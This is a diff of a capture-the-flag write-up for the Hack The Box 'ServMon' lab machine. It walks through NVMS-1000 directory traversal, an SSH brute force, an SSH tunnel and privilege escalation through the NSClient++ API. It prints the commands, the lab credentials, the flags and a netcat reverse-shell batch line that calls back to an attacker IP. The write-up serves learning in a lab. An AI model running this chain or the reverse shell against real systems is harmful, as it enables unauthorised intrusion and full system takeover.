@@ -180,10 +180,10 @@ Error: error on running goubster: unable to connect to http://10.10.10.184:8443/
 
 Taking a look at `http://10.10.10.184`.<br>
 We can find a login console for `NVMS-1000`.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-13/2020-12-13-09-59-04.png)
 
 Search vulnerabilities using `Searchsploit`.<br>
-We can find directory traversal vulnerabilities for `NVMS 1000`
+We can find directory traversal vulnerabilities for `NVMS 1000`.
 ```
 root@kali:/# searchsploit nvms
 -------------------------------------------------------------------- ---------------------------------
@@ -197,6 +197,8 @@ TVT NVMS 1000 - Directory Traversal                                 | hardware/w
 Shellcodes: No Results
 ```
 
+Since Metasploit has a module for this vulnerability.<br>
+First, try to achieve `/windows/win.ini`.
 ```
 msf6 > use auxiliary/scanner/http/tvt_nvms_traversal
 msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set rhosts 10.10.10.184
@@ -222,6 +224,8 @@ root@kali:/# cat /root/.msf4/loot/20201213101747_default_10.10.10.184_nvms.trave
 MAPI=1
 ```
 
+Next, try to get `/Users/Nathan/desktop/passwords.txt` mentioned in the text file found during FTP enumeration.<br>
+We can find a possible passwords list.
 ```
 msf6 > use auxiliary/scanner/http/tvt_nvms_traversal
 msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set rhosts 10.10.10.184
@@ -247,10 +251,12 @@ IfH3s4b0Utg0t0H1sH0me
 Gr4etN3w5w17hMySk1Pa5$
 ```
 
+Then, create the following username/password list.
 ```
 root@kali:/# cat users.txt 
 nadine
 nathan
+
 root@kali:/# cat passwords.txt 
 1nsp3ctTh3Way2Mars!
 Th3r34r3To0M4nyTrait0r5!
@@ -261,6 +267,8 @@ IfH3s4b0Utg0t0H1sH0me
 Gr4etN3w5w17hMySk1Pa5$
 ```
 
+Using the list created, try to bruteforce SSH service.<br>
+We can find a credential `nadine:L1k3B1gBut7s@W0rk`.
 ```
 msf6 > use auxiliary/scanner/ssh/ssh_login
 msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 10.10.10.184
@@ -278,6 +286,7 @@ msf6 auxiliary(scanner/ssh/ssh_login) > run
 [*] Auxiliary module execution completed
 ```
 
+Now we already have an active session as `Nadie` (created by Metasploit module).
 ```
 msf6 auxiliary(scanner/ssh/ssh_login) > sessions 1
 [*] Starting interaction with 1...
@@ -292,6 +301,7 @@ servmon\nadine
 nadine@SERVMON C:\Users\Nadine>
 ```
 
+`user.txt` is in the directory `C:\Users\Nadine\Desktop`.
 ```
 nadine@SERVMON C:\Users\Nadine>type .\desktop\user.txt
 type .\desktop\user.txt
@@ -300,6 +310,8 @@ db18154361a424fdba2ec9985560b178
 
 ## 3. Getting Root
 
+As always, check what software is installed.<br>
+This time, focus on `NSClient++` which is not installed by default.
 ```
 nadine@SERVMON C:\Program Files>dir
 dir
@@ -330,6 +342,8 @@ dir
               18 Dir(s)  27,728,986,112 bytes free
 ```
 
+Taking a look at the folder.<br>
+We have a config file `nsclient.ini`.
 ```
 nadine@SERVMON C:\Program Files>dir .\NSClient++
 dir .\NSClient++
@@ -382,6 +396,10 @@ dir .\NSClient++
                7 Dir(s)  27,728,986,112 bytes free
 ```
 
+In the config file `nsclient.ini`, we have tons of information.<br>
+What we need to know is the following.
+1. The password is `ew2x6SsGTxjRwXOT`
+2. Accessible host is `127.0.0.1`
 ```
 nadine@SERVMON C:\Program Files>type .\NSClient++\nsclient.ini
 type .\NSClient++\nsclient.ini
@@ -478,6 +496,7 @@ foobar = command = foobar
 allow arguments = true
 ```
 
+Since we already have a password for `nadine`, try to create a SSH tunnel to access `http://127.0.0.1:8443`.
 ```
 root@kali:~# ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
 nadine@10.10.10.184's password:  # L1k3B1gBut7s@W0rk
@@ -488,50 +507,55 @@ Microsoft Windows [Version 10.0.18363.752]
 nadine@SERVMON C:\Users\Nadine>
 ```
 
-Now we can access to `https://10.10.10.184:8443`
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)
+Now we can access to `https://10.10.10.184:8443` using web browser.
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-13/2020-12-13-10-43-15.png)
 
-We already know the password `ew2x6SsGTxjRwXOT`
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)
+We already know the password `ew2x6SsGTxjRwXOT`.<br>
+After logged in, we see the following metrics.
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-13/2020-12-13-21-45-04.png)
 
 To create an external script, we can go `Settings` -> `External Scripts` -> `Scripts` -> `+ Add new`.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-13/2020-12-13-10-51-49.png)
 
 Then, we have this console.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-13/2020-12-13-10-55-01.png)
 
-Before adding an external script, upload `nc64.exe` which can be downloaded.
+Before adding an external script, upload `nc64.exe` which can be downloaded from here.<br>
+We use `scp` to transfer these files since we already have the credential.
+```
+root@kali:~# scp ./nc64.exe nadine@10.10.10.184:C:/temp/nc64.exe
+nadine@10.10.10.184's password: # L1k3B1gBut7s@W0rk
+nc64.exe                                      100%   44KB  54.4KB/s   00:00
+```
+
+After that, create the following script to be executed by NSClient.
 ```
 root@kali:~# cat rshell.bat 
 @echo off
 C:\Temp\nc64.exe 10.10.14.42 4443 -e cmd.exe
-
-root@kali:~# scp ./rshell.bat  nadine@10.10.10.184:C:/temp/rshell.bat
-nadine@10.10.10.184's password:
-rshell.bat                                    100%   55     0.2KB/s   00:00
-
-root@kali:~# scp ./nc64.exe nadine@10.10.10.184:C:/temp/nc64.exe
-nadine@10.10.10.184's password:
-nc64.exe                                      100%   44KB  54.4KB/s   00:00
 ```
 
-Add the following new external script here.
-![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-08-23/2020-08-23-10-45-44.png)
-
+Using API, register the previous batch script.
 ```
-; in flight - TODO
-[/settings/external scripts/scripts/rshell]
-
-; COMMAND - Command to execute
-command = C:\temp\rshell.bat
+root@kali:~# curl -s -k -u admin -XPUT https://localhost:8443/api/v1/scripts/ext/scripts/rshell.bat --data-binary @rshell.bat
+Enter host password for user 'admin':
+Added rshell as scripts\rshell.bat
 ```
 
+Launch `netcat` listener on port 4443.
 ```
 root@kali:~# nc -nlvp 4443
 Listening on 0.0.0.0 4443
 ```
 
+To run the uploaded script manually, execute the following command.<br>
+We can run the external script using the API.
+```
+root@kali:~# curl -k -u "admin:ew2x6SsGTxjRwXOT" https://127.0.0.1:8443/api/v1/queries/rshell/commands/execute
+{"command":"rshell","lines":[{"message":"Command rshell didn't terminate within the timeout period 60s","perf":{}}],"result":3}
+```
 
+Now we have a reverse shell as `root`.
 ```
 root@kali:~# nc -nlvp 4443
 Listening on 0.0.0.0 4443
@@ -544,9 +568,9 @@ whoami
 nt authority\system
 ```
 
+As always, `root.txt` is in the directory `C:\Users\Administrator\Desktop`.
 ```
 C:\Program Files\NSClient++>type C:\users\administrator\desktop\root.txt
 type C:\users\administrator\desktop\root.txt
 5d7af017e7cb626125c96ce510ae37c0
 ```
-
